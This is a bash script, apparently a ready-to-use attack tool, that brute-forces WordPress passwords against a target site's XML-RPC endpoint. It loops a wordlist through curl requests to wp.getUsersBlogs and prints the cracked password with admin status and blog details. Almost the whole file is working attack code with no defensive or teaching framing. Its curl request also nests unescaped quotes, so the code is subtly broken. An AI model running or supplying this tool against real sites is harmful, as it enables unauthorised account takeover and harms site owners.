#!/bin/bash

#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"




trap exitFunc INT

exitFunc () {
  tput cnorm
  if [[ $1 ]]; then
    echo -e "\n${redColour}[!] $1 ${endColour}" 
  fi
  echo -e "${redColour}\n\n[!] Exiting...\n${endColour}"
  exit $statusCode
}

helpPanel () {
  echo -e "\n${redColour}[!]${endColour} ${grayColour}Use:${endColour}${purpleColour} $0${endColour}"
  echo -e "\t ${yellowColour}-w:${endColour}${grayColour} Wordlist\n\t\tPasword Wordlist\n${endColour}"
  echo -e "\t ${yellowColour}-u: ${endColour}${grayColour}Username\n\t\tVerified Username to do the attack\n${endColour}"
  echo -e "\t ${yellowColour}-t: ${endColour}${grayColour}Target\n\t\tURI to attack\n${endColour}"
  exit $statusCode
}

xmlrpcBruteForce () {
  echo -e "${yellowColour}[-]${endColour}${grayColour} Testing the URI:${endColour}${greenColour} $target${endColour}"
  sleep 0.3
  echo -e "${yellowColour}[-]${endColour}${grayColour} With the Username:${endColour}${blueColour} $username${endColour}" 
  sleep 0.3
  echo -e "${yellowColour}[-]${endColour} ${grayColour}And the Wordlist:${endColour} ${turquoiseColour}$wordlistPath${endColour}"
  sleep 0.3 
  echo -e "${purpleColour}[*]${endColour} ${grayColour}Running the attack...${endColour}"
  sleep 0.3

  while read -r password; do
    response=$(curl -s -X POST $target -d "<?xml version="1.0" encoding="UTF-8"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>$username</value></param><param><value>$password</value></param></params></methodCall>")
    if [[ ! $(grep "Incorrect username or password." <<< $response) ]]; then
      echo -e "\n\n${purpleColour}[*]${endColour}${grayColour} The password for${endColour}${blueColour} $username${endColour} ${grayColour}is${endColour} ${redColour}$password${endColour}"
      xmlData=$( xmlstarlet sel -t -v "//member[name='isAdmin']/value/boolean" -o " " -v "//member[name='blogid']/value/string" -o " " -v "//member[name='blogName']/value/string" -n <<< $response)
      echo -e "${yellowColour}[*]${endColour} ${grayColour}Admin User:${endColour} ${turquoiseColour}$(cut -d " "  -f 1 <<< $xmlData)${endColour}"
      echo -e "${yellowColour}[*]${endColour} ${grayColour}Blog ID:${endColour} ${turquoiseColour}$(cut -d " " -f 2 <<< $xmlData)${endColour}"
      echo -e "${yellowColour}[*]${endColour} ${grayColour}Blog Name:${endColour} ${turquoiseColour}$(cut -d " " -f 3- <<< $xmlData)${endColour}"

      break; exit 0
    fi
  done < $wordlistPath
}


while getopts "w:u:t:h" arg; do 
  case $arg in 
    w)wordlistPath=$OPTARG;; 
    u)username=$OPTARG;;
    t)target=$OPTARG;;
    h)statusCode=0; helpPanel;;
    \?)statusCode=1; helpPanel;;
  esac
done


if [[ -r $wordlistPath ]] && [[ $username ]] && [[ $target ]]; then
  xmlrpcBruteForce

else
  exitFunc "Some parameter is incorrect"
fi


#<?xml version="1.0" encoding="UTF-8"?>
#<methodCall> 
#<methodName>wp.getUsersBlogs</methodName> 
#<params> 
#<param><value>\{\{your username\}\}</value></param> 
#<param><value>\{\{your password\}\}</value></param> 
#</params> 
#</methodCall>
